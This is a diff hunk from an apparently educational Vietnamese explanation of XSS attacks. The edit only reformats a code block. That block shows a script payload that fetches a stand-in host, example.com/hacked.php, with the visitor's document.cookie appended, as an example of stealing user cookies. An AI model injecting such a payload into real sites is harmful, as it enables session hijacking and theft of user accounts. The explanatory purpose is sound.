@@ -9,7 +9,9 @@ Thông thường, các cuộc tấn công XSS được sử dụng để vượt
 
 Mục đích chính của cuộc tấn công này là ăn cắp dữ liệu nhận dạng của người dùng như:
 
-```<script>fetch(`http://example.com/hacked.php?xss=${document.cookie}`)</script>```
+```
+<script>fetch(`http://example.com/hacked.php?xss=${document.cookie}`)</script>
+```
 
 cookies
 
